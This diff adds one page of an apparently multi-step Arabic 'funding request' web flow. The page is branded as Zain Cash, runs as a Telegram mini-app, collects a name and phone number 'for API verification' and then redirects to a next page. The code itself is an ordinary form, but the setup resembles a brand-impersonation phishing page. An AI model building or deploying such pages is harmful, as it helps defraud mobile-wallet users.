@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>طلب التمويل - الخطوة 2</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f4f7;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(135deg, #581d72, #a1278a);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .zain-logo {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .form-card {
+            background: white;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 25px;
+            padding: 30px 20px;
+            border-radius: 16px;
+            box-shadow: 0 8px 20px rgba(88, 29, 114, 0.12);
+            box-sizing: border-box;
+        }
+
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .active-bar {
+            background: #8c237e;
+        }
+
+        .input-wrap {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            color: #444;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #d1d1d1;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+            color: #333;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: #8c237e;
+            outline: none;
+            background-color: #fff;
+        }
+
+        input::placeholder {
+            color: #aaa;
+        }
+
+        .phone-container {
+            display: flex;
+            gap: 10px;
+            direction: ltr; /* Keeps phone layout reading left-to-right properly */
+        }
+
+        .country-code {
+            width: 85px;
+            background: #eee;
+            text-align: center;
+            font-weight: bold;
+            border: 1px solid #d1d1d1;
+            line-height: 52px;
+            color: #333;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        .phone-input {
+            flex: 1;
+            text-align: right;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: #777;
+            margin-top: 8px;
+            text-align: right;
+        }
+
+        .btn-container {
+            margin-top: 40px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background-color: #f1f1f5;
+            color: #666;
+            border: 1px solid #ddd;
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .next-btn {
+            background: linear-gradient(135deg, #8c237e, #581d72);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(140, 35, 126, 0.25);
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+            margin: 40px 0 30px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="nav-header">
+    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← رجوع</div>
+    <div class="zain-logo">زين كاش</div>
+    <div style="font-size: 22px;">☰</div>
+</div>
+
+<div class="form-card">
+    <div class="progress-box">
+        <div class="bar active-bar"></div>
+        <div class="bar active-bar"></div>
+        <div class="bar"></div>
+    </div>
+
+    <div class="input-wrap">
+        <label>الاسم الأول</label>
+        <input type="text" id="firstName" placeholder="أحمد">
+    </div>
+
+    <div class="input-wrap">
+        <label>اسم العائلة</label>
+        <input type="text" id="lastName" placeholder="حسن">
+    </div>
+
+    <div class="input-wrap">
+        <label>رقم الهاتف المحمول</label>
+        <div class="phone-container">
+            <div class="country-code">+964</div>
+            <input type="tel" id="phone" class="phone-input" placeholder="7812345678" maxlength="10">
+        </div>
+        <p class="phone-hint">أدخل 10 أرقام تبدأ بـ 07 (أو بدون الصفر)</p>
+    </div>
+
+    <div class="btn-container">
+        <button type="button" class="back-btn" onclick="goBack()">السابق</button>
+        <button type="button" class="next-btn" onclick="goNext()">الخطوة التالية</button>
+    </div>
+</div>
+
+<div class="footer-text">© 2026 زين كاش العراق. جميع الحقوق محفوظة.</div>
+
+<script>
+    function goNext() {
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !phone) {
+            alert("يرجى ملء جميع الحقول المطلوبة.");
+            return;
+        }
+
+        if (!/^\d{10}$/.test(phone)) {
+            alert("يرجى إدخال رقم هاتف محمول صحيح يتكون من 10 أرقام.");
+            return;
+        }
+
+        // Save for general flow
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('phone', phone);
+        
+        // CRITICAL: Save specifically for the API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page3";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing data
+        const f = localStorage.getItem('firstName');
+        const l = localStorage.getItem('lastName');
+        const p = localStorage.getItem('phone');
+
+        if (f) document.getElementById('firstName').value = f;
+        if (l) document.getElementById('lastName').value = l;
+        if (p) document.getElementById('phone').value = p;
+    };
+</script>
+
+</body>
+</html>
